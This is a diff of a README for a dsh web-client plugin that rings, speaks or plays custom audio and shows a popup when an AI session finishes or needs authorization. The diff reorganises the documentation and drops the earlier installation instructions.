@@ -1,72 +1,108 @@
+---
+description: "Sound-alert plugin for the dsh web client: rings and shows a bottom-right popup on answer-complete and authorization-needed edges; built-in ringtone, text-to-speech, or a custom audio file, configured from a General settings row."
+kind: "package-reference"
+---
+
 # @deepseek-ai/dsh-client-ui-notify
 
 English | [中文](README.zh.md)
 
-**Sound-alert plugin** for the web client: rings, shows a bottom-right popup, and can send a browser system notification when a session's answer completes and when a session needs authorization, so a background conversation cannot finish unnoticed.
-The browser half provides `ctx.notify` (a `NotifyRuntime`), registers a preference row into the settings **General** section, and registers the popup into the shell's floating overlay seat; the Host half exposes the durable `ui-notify` settings namespace the row reads and writes through `ctx.settingsScope`, stored in the user-settings document (`$DSH_HOME/settings.yaml` by default).
+## Summary
 
-## Alert events
+`dsh-client-ui-notify` is the browser notification plugin for the dsh web client: it observes the session list and pending-interaction map, plays a sound when a session's answer completes or a session needs authorization, shows a transient bottom-right popup for every ring, and can send a browser system notification. The playback method is user-configurable from a General settings row — a bundled two-tone ringtone, text-to-speech over the configured text, or a custom audio file uploaded through a trust-fenced Host route (the durable setting stores the served URL, never the file bytes). The Host half registers the durable `ui-notify` settings namespace, serves the user-audio route, and sweeps orphaned audio on activation.
 
-The runtime observes `ctx.sessions.list` and rings in two situations, both gated by the master switch and their own toggle:
+## Table of Contents
 
-- **Answer complete** — a session's `running` bit flips true → false (the sidebar's green "done" reminder, current session included).
-- **Authorization needed** — a session's `pendingInteraction` appears (approval, plan review, or ask-user question).
+- [Use this package](#use-this-package)
+- [Understand the implementation](#understand-the-implementation)
+- [Further Exploration](#further-exploration)
+- [Model Experience](#model-experience)
+- [Known Limitations and Deferred Work](#known-limitations-and-deferred-work)
+- [Dev Note](#dev-note)
 
-The first list snapshot only records observed state (a session already idle at load rings nothing), and `connection/reset` re-baselines so reconnect status replay cannot ring.
+-----
 
-## Popup notification
+<a id="use-this-package"></a>
+## Use this package
 
-With the **System notification** toggle on, every ring also sends a browser **Notification API** notification (title = the edge, body = the session label), visible even while the tab is in the background — unlike the in-page popup. Enabling the toggle requests the browser's Notification permission (the switch click is the user gesture); permission must be granted for notifications to fire, and denied or unsupported browsers refuse the toggle with an inline message. The sender degrades to a no-op without granted permission, so it never throws from an event handler.
+The web shell composes this plugin like any other `dsh.client` row; it renders nothing until the user opens the General settings section, where the notification row appears. The row owns the master switch, the system-notification channel (requesting browser permission on first enable), the two event toggles, the sound-type selector, and the method inputs — every control writes one durable field through the runtime, so the settings transport stays behind one owner.
 
-## Alert methods
+### Enabling the alert
 
-- **Built-in ringtone** — a two-tone chime synthesized at build time, embedded as a base64 data URI in the client bundle (`src/client/builtin-ringtone.ts`), so no extra asset route exists.
-- **Text to speech** — `speechSynthesis.speak` reads the configured text aloud (skipped when the text is empty).
-- **Custom audio** — plays an http(s) URL or a data URL, or a local file the row uploads to the host (≤ 1MB).
-The uploaded file lands under `$DSH_HOME/storages/ui-notify/audio/`, read and written through the trust-fenced `/_dsh-ui-notify/audio/<id>.<ext>` webServer route (the same browser-trust fence as `/api`, loopback-only); the durable setting stores just the served URL — file bytes never enter the settings document.
-Common audio formats are supported (wav, mp3, ogg, mp4, m4a, webm, aac, flac, aiff, wma, mid).
+Turn on the master switch to arm the ringtone; the two event toggles pick which edges ring (answer complete, authorization needed, or both), and the system-notification switch adds a browser Notification per ring. The preview button plays the currently configured method immediately, independent of the master switch.
 
-Playback degrades to a no-op when the platform capability is absent, so a misconfigured alert never throws from an event handler. The row's **Preview** button plays the current method immediately.
+### Choosing a sound
 
-On every host activation, a retention sweep removes stored audio files the current setting no longer references (a hand-edited `customAudioUrl`, an upload whose settings write never landed, or a failed eager cleanup) — only files matching the canonical `<uuid>.<ext>` id pattern are ever touched.
+The built-in ringtone needs no setup. Text-to-speech speaks the configured text through the platform synthesizer. The custom method accepts an http(s) URL or a local audio file up to 1 MB; a picked file uploads to the Host route and the setting stores the served URL, so file bytes never bloat the settings document. Replacing the file deletes the previous one.
 
-## Settings Window
+### Observable success and failures
 
-![Notification settings in General settings](./images/screenshot.png)
+A fired edge plays the sound and emits `notify/alert`; with the system toggle on it also emits `notify/system`. The popup follows the master switch and the event toggles, with no separate toggle. A misconfigured method, an empty TTS text, a missing custom URL, an unpermitted Notification, or a platform without audio support degrades to a no-op instead of throwing from an event handler.
 
-The General settings row adds the **Enable alerts** master switch, the **System notification** switch, the two event switches (**alert when an answer completes** / **alert when authorization is needed**), the **Sound type** selector, the method-specific **input** fields, and the **Preview** button. Every control writes exactly one field through the injected `setField` face; the row never touches the settings transport itself. The Host half registers the namespace only when the settings provider is composed, so a deployment without one shows no row and no namespace.
+-----
 
-## Installation
+<a id="understand-the-implementation"></a>
+## Understand the implementation
 
-**Quick start**: download the [installer (zip)](https://github.com/byh819-png/dsh-client-ui-notify/raw/main/release/dsh-client-ui-notify-0.1.1-rc.2.zip), extract it, and run `install.ps1` on Windows or `bash install.sh` on macOS/Linux; restart `dsh web` and you are done.
+<details>
+<summary>Implementation internals — click to expand</summary>
 
-Manual installation:
+The package realizes one ownership rule: the runtime owns the durable section and every playback decision, the settings row mirrors the same config, and the Host owns the only byte store in the seam.
 
-1. Copy the plugin directory (`package.json` + `lib/`) to `$DSH_HOME/profiles/node_modules/@deepseek-ai/dsh-client-ui-notify/` (`$DSH_HOME` defaults to `~/.dsh`).
-2. Append the loader row to `$DSH_HOME/profiles/web/cordis.patch.yml` (or the profile that serves the web UI):
+### Edge detection
 
-   ```yaml
-   - insert:
-       - id: ui-notify
-         name: '@deepseek-ai/dsh-client-ui-notify'
-   ```
+`NotifyRuntime` adopts the settings scope and diffs the session list plus the pending-interaction map against a per-session mirror. Running → idle fires "answer complete"; a pending interaction appearing fires "authorization needed". The first snapshot only records (sessions already idle at load ring nothing), and `connection/reset` re-baselines so reconnect status replays cannot fabricate edges. Each fired edge plays the configured sound and emits the `notify/alert` and optional `notify/system` events on the owning context.
 
-3. Restart `dsh web` and refresh the browser; the notification settings (**Enable alerts**, **System notification**, and the two event toggles) appear under Settings → General.
+### User-audio store
 
-To uninstall: delete the copied directory and the `ui-notify` rows from `cordis.patch.yml`.
+The custom-method file lands in `$DSH_HOME/storages/ui-notify/audio` through a webServer prefix route (`/_dsh-ui-notify/audio/<uuid>.<ext>`) guarded by the same loopback trust fence as the `/api` privileged methods. The URL tail is pinned to a canonical UUID plus a whitelisted extension before any file is touched; uploads are bounded at 1 MB and the response carries an immutable cache header because the id names the content. A retention sweep at Host activation removes files the setting no longer references, touching only files matching the canonical id pattern.
 
-> The plugin is a plain npm package; its runtime dependencies (cordis, dsh-settings, …) come from dsh's built-in closure, so no extra install is needed.
+### Settings row and popup
 
+The row registers into the General section's item slot with a store mirroring the runtime config, gated by the runtime's monotonic revision so stale duplicates never render. The popup registers into the shell's floating overlay seat; the newest alert wins (replaces the current toast), holds, fades, then dismisses itself or on user close. The card renders through a body portal and stays click-through so an announcement never blocks the app underneath.
+
+</details>
+
+-----
+
+<a id="further-exploration"></a>
+## Further Exploration
+
+These pages cover the surfaces this plugin composes into.
+
+- [ui-settings](../ui-settings/README.md) — the settings-namespace scope service the row's transport rides.
+- [ui-settings-general](../ui-settings-general/README.md) — the settings shell hosting the General section.
+- [ui-session](../ui-session/README.md) — the pending-interaction root the runtime observes.
+- [settings](../../settings/README.md) — the durable user-settings seam and its file provider.
+
+-----
+
+<a id="model-experience"></a>
 ## Model Experience
 
-None, as the plugin plays browser sounds; nothing here reaches a model request.
+None, as the package is a browser-side notification UI; it registers nothing model-facing.
 
 #### KV Cache effect
 
-None; this package neither assembles nor sends a provider request.
+None; the plugin assembles no provider request and adds no session event of its own.
 
 ## Known Limitations and Deferred Work
 
-- **User-audio route is loopback-only** — a LAN deployment that serves the browser through `trustedHosts` gets 403 on uploads/downloads (playback of http(s)/data URLs is unaffected); wiring the route into the trusted-host list is deferred.
-- **TTS voices follow the browser** — no voice/rate/pitch controls exist; the text field is the only TTS input.
-- **One text for both events** — the TTS method speaks the same text whether an answer completed or authorization is needed.
+<a id="known-limitations-and-deferred-work"></a>
+
+These limits define where the notification seam cannot reach; they are current package constraints.
+
+- **The popup keeps only the newest alert** — a burst of fired edges rings for each but collapses to the latest toast; there is no notification queue.
+- **System notifications require the browser grant** — the row requests permission on first enable; without the grant or platform support the channel silently no-ops.
+- **Custom audio is capped at 1 MB** per file and accepts only whitelisted audio extensions; larger or exotic files must use an http(s) URL instead.
+- **The ringtone is fixed** — one bundled two-tone chime for both edges; the popup distinguishes kinds by accent color, not sound.
+
+<a id="dev-note"></a>
+### Dev Note
+
+<details>
+<summary>Working context for maintainers — click to expand</summary>
+
+The popup's hold and fade timings live in two places that must agree: `HOLD_MS`/`FADE_MS` in `NotifyToast.tsx` and the `dsh-notify-toast-fade` animation delay/duration in `NotifyToast.module.css` — a mismatch cuts the fade or leaves an invisible card behind. The user-audio route trusts the same `isTrustedApiRequest` pin as `/api`; keep it loopback-only.
+
+</details>
